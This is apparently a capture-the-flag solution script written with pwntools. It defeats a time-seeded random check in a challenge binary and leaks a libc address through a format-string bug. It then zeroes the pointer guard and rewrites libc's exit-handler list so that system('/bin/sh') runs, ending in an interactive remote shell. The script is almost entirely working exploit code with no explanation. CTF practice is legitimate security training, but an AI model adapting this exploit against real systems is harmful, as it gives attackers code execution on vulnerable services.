#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL

context.terminal = ["kitty", "@launch", "--location=split"]
exe = context.binary = ELF(args.EXE or '../dist/chall')
libc = ELF(libcdb.search_by_build_id(
    "a43bfc8428df6623cd498c9c0caeb91aec9be4f9"))
dll = CDLL("libc.so.6")

host = args.HOST or '0.0.0.0'
port = int(args.PORT or 10002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def jackpot(payload):
    dll.srand(dll.time(0))
    x = dll.rand() * dll.rand() % 0x100000000
    num = (x - 777) % 0x100000000
    io.sendlineafter(b": ", str(num).encode())
    io.sendlineafter(b"? ", payload)

io = start()

jackpot(b"%47$p")
io.recvuntil(b"You say: ")
libc.address = int(io.recvline(), 16) - libc.sym["__libc_start_call_main"] - 128
log.info(f"libc @ 0x{libc.address:x}")
assert libc.address & 0xfff == 0
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]
exitfuncs = libc.sym["initial"]
fsbase = libc.address - 0x28c0
log.info(f"fs @ 0x{fsbase:x}")

payload = fmtstr_payload(10, {fsbase+0x30: 0}, write_size="long")
jackpot(payload)

payload = fmtstr_payload(10, {exitfuncs: flat(0, 1, 4, encrypt(system, 0), binsh)}, write_size="short")
jackpot(payload)

io.sendlineafter(b"number: ", b"0")

io.interactive()
